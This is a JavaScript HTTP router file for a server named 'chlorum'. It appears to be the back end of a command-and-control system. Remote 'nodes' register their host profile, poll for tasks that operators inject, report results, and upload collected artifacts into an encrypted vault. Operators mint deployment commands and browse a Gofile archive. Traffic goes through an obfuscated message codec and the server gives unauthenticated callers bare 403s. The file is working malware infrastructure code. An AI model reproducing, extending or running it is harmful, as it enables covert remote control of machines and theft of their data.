// server/routes.mjs — the single router
//
//   /api/auth/*   operator JSON endpoints, session cookie
//   /api/*        operator JSON endpoints, session required
//   /api/chl/*    node endpoints, reagent codec + raw vault intake
//   /*            static console UI
//
// Node endpoints are rate-limited per IP. Reagent bodies that fail
// to open get a generic 403 — the router does not explain itself to
// unauthenticated traffic.

import { randomBytes } from "node:crypto";
import { existsSync, readFileSync } from "node:fs";
import { extname, join } from "node:path";

import { packReagent, unpackReagent, newReagent } from "../chloride/codec.mjs";
import { loadVaultFile } from "../chloride/vault.mjs";
import {
  login,
  operatorFromRequest,
  sessionCookie,
  signup,
} from "./auth.mjs";
import { uploadToGofile } from "./gofile.mjs";
import { validateTask, listTaskTypes } from "./hypochlorite/dispatch.mjs";
import {
  deploymentCommands,
  deriveProfileKey,
  deriveVaultKey,
  mintTaskId,
  normalizeProfile,
  validTaskId,
} from "./hypochlorite/register.mjs";
import { ingestLogLines, ingestUpload } from "./hypochlorite/store.mjs";

const RATE_WINDOW_MS = 60_000;
const RATE_MAX = 120;

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
};

function readBody(req, limit) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on("data", (chunk) => {
      size += chunk.length;
      if (size > limit) {
        reject(new Error("body too large"));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on("end", () => resolve(Buffer.concat(chunks)));
    req.on("error", reject);
  });
}

async function readJson(req, limit) {
  const buf = await readBody(req, limit);
  try {
    return { ok: true, body: JSON.parse(buf.toString("utf8") || "{}") };
  } catch {
    return { ok: false };
  }
}

function sendJson(res, status, obj, extraHeaders = {}) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "content-length": Buffer.byteLength(body),
    "cache-control": "no-store",
    ...extraHeaders,
  });
  res.end(body);
}

function sendReagent(res, profileKey, reagent) {
  const body = packReagent(reagent, profileKey);
  res.writeHead(200, {
    "content-type": "application/octet-stream",
    "content-length": body.length,
    "cache-control": "no-store",
  });
  res.end(body);
}

const rateBuckets = new Map();

function rateLimited(ip) {
  const now = Date.now();
  const bucket = rateBuckets.get(ip);
  if (!bucket || now - bucket.t0 > RATE_WINDOW_MS) {
    rateBuckets.set(ip, { n: 1, t0: now });
    return false;
  }
  bucket.n += 1;
  return bucket.n > RATE_MAX;
}

export function createRouter({ config, state, uiDir }) {
  const secure = false; // set true behind TLS termination

  async function handle(req, res) {
    const url = new URL(req.url, "http://chlorum.local");
    const path = url.pathname;

    try {
      if (path.startsWith("/api/")) {
        const ip =
          req.socket.remoteAddress || "0.0.0.0";

        if (path.startsWith("/api/chl/")) {
          if (rateLimited(ip)) return sendJson(res, 429, { error: "slow down" });
          return await handleNode(req, res, path);
        }
        if (path.startsWith("/api/auth/")) return await handleAuth(req, res, path, secure);
        return await handleOperatorApi(req, res, path, url, secure);
      }
      return serveStatic(req, res, path, uiDir);
    } catch (err) {
      if (!res.headersSent) {
        sendJson(res, 500, { error: "console error" });
      }
      console.error("[chlorum] handler error:", err.message);
    }
  }

  // ---- operator auth ----

  async function handleAuth(req, res, path, secure) {
    if (req.method === "GET" && path === "/api/auth/me") {
      const op = operatorFromRequest(state, req);
      if (!op) return sendJson(res, 401, { error: "no session" });
      return sendJson(res, 200, { email: op.email, role: op.role });
    }
    if (req.method !== "POST") return sendJson(res, 405, { error: "method" });
    const parsed = await readJson(req, 64 * 1024);
    if (!parsed.ok) return sendJson(res, 400, { error: "body is not valid JSON" });
    const body = parsed.body;

    if (path === "/api/auth/signup") {
      try {
        const op = signup(state, body);
        // the first keyholder lands directly in the console — no
        // separate login round-trip after holding the keys
        const sid = randomBytes(24).toString("hex");
        state.putSession(sid, op.email);
        return sendJson(res, 201, { ok: true, role: op.role }, {
          "set-cookie": sessionCookie(sid, secure),
        });
      } catch (err) {
        return sendJson(res, 400, { error: err.message });
      }
    }
    if (path === "/api/auth/login") {
      const result = login(state, body);
      if (!result) return sendJson(res, 401, { error: "wrong credentials" });
      return sendJson(res, 200, { ok: true, role: result.op.role }, {
        "set-cookie": sessionCookie(result.sid, secure),
      });
    }
    if (path === "/api/auth/logout") {
      const sid = (req.headers.cookie || "").match(/chl_sid=([a-f0-9]+)/)?.[1];
      if (sid) state.dropSession(sid);
      return sendJson(res, 200, { ok: true }, {
        "set-cookie": "chl_sid=; Path=/; Max-Age=0; HttpOnly; SameSite=Strict",
      });
    }
    return sendJson(res, 404, { error: "not found" });
  }

  // ---- operator api (session required) ----

  function requireOperator(req, res) {
    const op = operatorFromRequest(state, req);
    if (!op) {
      sendJson(res, 401, { error: "no session" });
      return null;
    }
    return op;
  }

  async function handleOperatorApi(req, res, path, url, secure) {
    if (path === "/api/auth/login" || path === "/api/auth/signup") {
      return; // handled earlier
    }
    const op = requireOperator(req, res);
    if (!op) return;

    if (req.method === "GET" && path === "/api/operator") {
      return sendJson(res, 200, {
        email: op.email,
        role: op.role,
        agents: state.listAgents(),
        logCount: state.data.logs.length,
        artifactCount: state.data.artifacts.length,
        taskTypes: listTaskTypes(),
      });
    }

    if (req.method === "POST" && path === "/api/mint") {
      const taskId = mintTaskId();
      const host = req.headers.host || `127.0.0.1:${config.port}`;
      const scheme = req.socket.encrypted ? "https" : "http";
      return sendJson(res, 201, deploymentCommands(taskId, `${scheme}://${host}`));
    }

    if (req.method === "GET" && path === "/api/agents") {
      return sendJson(res, 200, { agents: state.listAgents() });
    }

    const agentTaskMatch = path.match(/^\/api\/agents\/([\w-]+)\/tasks$/);
    if (agentTaskMatch) {
      const agentId = agentTaskMatch[1];
      if (!state.data.agents[agentId]) return sendJson(res, 404, { error: "unknown node" });
      if (req.method === "GET") {
        return sendJson(res, 200, { tasks: state.listTasks(agentId) });
      }
      if (req.method === "POST") {
        const parsed = await readJson(req, 256 * 1024);
        if (!parsed.ok) return sendJson(res, 400, { error: "body is not valid JSON" });
        const body = parsed.body;
        const check = validateTask(body.type, body.args);
        if (!check.ok) return sendJson(res, 400, { error: check.error });
        const task = state.enqueueTask(agentId, body.type, check.args);
        state.addLog(agentId, "task", "info", `injected ${body.type} task ${task.id}`);
        return sendJson(res, 201, { task });
      }
    }

    if (req.method === "GET" && path === "/api/tasks") {
      return sendJson(res, 200, { tasks: state.listAllTasks() });
    }

    if (req.method === "GET" && path === "/api/logs") {
      const agentId = url.searchParams.get("agent") || null;
      const after = Number(url.searchParams.get("after") || 0);
      return sendJson(res, 200, { logs: state.getLogs(agentId, after) });
    }

    if (req.method === "GET" && path === "/api/vault") {
      const agentId = url.searchParams.get("agent") || null;
      return sendJson(res, 200, { artifacts: state.listArtifacts(agentId) });
    }

    const vaultFileMatch = path.match(/^\/api\/vault\/([\w.-]+\.chl)$/);
    if (req.method === "GET" && vaultFileMatch) {
      const name = vaultFileMatch[1];
      const rec = state.data.artifacts.find((a) => a.name === name);
      if (!rec) return sendJson(res, 404, { error: "unknown artifact" });
      let plaintext;
      try {
        plaintext = loadVaultFile(
          join(config.vaultDir, rec.agentId),
          name,
          deriveVaultKey(rec.agentId, config.adminToken)
        );
      } catch {
        return sendJson(res, 410, { error: "vault file unreadable" });
      }
      if (url.searchParams.get("raw") === "1") {
        res.writeHead(200, {
          "content-type": "application/octet-stream",
          "content-length": plaintext.length,
          "content-disposition": `attachment; filename="${name.replace(/\.chl$/, "")}"`,
        });
        return res.end(plaintext);
      }
      const text = plaintext.subarray(0, 8192).toString("utf8");
      return sendJson(res, 200, {
        name,
        bytes: plaintext.length,
        kind: rec.kind,
        at: rec.at,
        preview: text,
        truncated: plaintext.length > 8192,
      });
    }

    if (req.method === "GET" && path === "/api/gofile") {
      return sendJson(res, 200, { archive: state.listArchive() });
    }

    return sendJson(res, 404, { error: "not found" });
  }

  // ---- node endpoints ----

  async function handleNode(req, res, path) {
    if (req.method !== "POST") return sendJson(res, 405, { error: "method" });

    const taskId = req.headers["x-chl-task"];
    if (!validTaskId(taskId)) return sendJson(res, 403, { error: "no" });
    const profileKey = deriveProfileKey(taskId);

    if (path === "/api/chl/in") {
      const body = await readBody(req, 1024 * 1024);
      let reagent;
      try {
        reagent = unpackReagent(body, profileKey);
      } catch {
        return sendJson(res, 403, { error: "no" });
      }
      const m = reagent.m || {};

      if (reagent.r === "hypochlorite.register") {
        if (!validTaskId(m.agentId)) return sendJson(res, 403, { error: "no" });
        const agent = state.upsertAgent(m.agentId, normalizeProfile(m.profile));
        const pending = state.claimTasks(m.agentId);
        state.addLog(m.agentId, "node", "info", `node registered: ${agent.profile.host || m.agentId}`);
        return sendReagent(res, profileKey, newReagent("hypochlorite.welcome", { agentId: m.agentId, pending }));
      }

      if (reagent.r === "hypochlorite.poll") {
        if (!validTaskId(m.agentId) || !state.data.agents[m.agentId]) {
          return sendJson(res, 403, { error: "no" });
        }
        state.touchAgent(m.agentId);
        const pending = state.claimTasks(m.agentId);
        return sendReagent(res, profileKey, newReagent("hypochlorite.dispatch", { pending }));
      }

      if (reagent.r === "hypochlorite.result") {
        if (!validTaskId(m.agentId) || !state.data.agents[m.agentId]) {
          return sendJson(res, 403, { error: "no" });
        }
        state.touchAgent(m.agentId);
        state.finishTask(m.agentId, m.taskId, !!m.ok, m);
        // a probe result carries a fresh profile — apply it so the
        // node card reflects the current state of the box
        if (m.profile && typeof m.profile === "object") {
          state.upsertAgent(m.agentId, normalizeProfile(m.profile));
        }
        const summary = m.ok
          ? `task ${m.taskId} done${m.summary ? `: ${m.summary}` : ""}`
          : `task ${m.taskId} failed: ${m.error || "unknown"}`;
        state.addLog(m.agentId, "task", m.ok ? "info" : "warn", String(summary).slice(0, 2000));
        return sendReagent(res, profileKey, newReagent("hypochlorite.ack", { ok: true }));
      }

      if (reagent.r === "hypochlorite.log") {
        if (!validTaskId(m.agentId) || !state.data.agents[m.agentId]) {
          return sendJson(res, 403, { error: "no" });
        }
        const count = ingestLogLines(state, m.agentId, m.lines);
        return sendReagent(res, profileKey, newReagent("hypochlorite.ack", { ok: true, count }));
      }

      return sendJson(res, 404, { error: "unknown reagent" });
    }

    if (path === "/api/chl/up") {
      const agentId = req.headers["x-chl-agent"];
      if (!validTaskId(agentId) || !state.data.agents[agentId]) {
        return sendJson(res, 403, { error: "no" });
      }
      const body = await readBody(req, 8 * 1024 * 1024);
      const result = await ingestUpload({
        config,
        state,
        agentId,
        taskId,
        kind: req.headers["x-chl-kind"] || "artifact",
        name: req.headers["x-chl-name"] || "drop",
        gzip: req.headers["x-chl-gzip"] === "1",
        body,
      });
      if (!result.ok) return sendJson(res, 400, result);
      return sendJson(res, 201, result);
    }

    return sendJson(res, 404, { error: "not found" });
  }

  // ---- static ----

  function serveStatic(req, res, path, uiDir) {
    if (req.method !== "GET" && req.method !== "HEAD") {
      return sendJson(res, 405, { error: "method" });
    }
    let rel = path === "/" ? "/index.html" : path;
    const file = join(uiDir, rel.replace(/\.\./g, ""));
    if (!existsSync(file)) {
      // SPA-ish fallback: anything unknown goes to the console shell
      const index = join(uiDir, "index.html");
      if (!existsSync(index)) return sendJson(res, 404, { error: "ui missing" });
      const body = readFileSync(index);
      res.writeHead(200, { "content-type": MIME[".html"] });
      return res.end(body);
    }
    const body = readFileSync(file);
    res.writeHead(200, {
      "content-type": MIME[extname(file)] || "application/octet-stream",
      "cache-control": "no-store",
    });
    res.end(body);
  }

  return { handle };
}
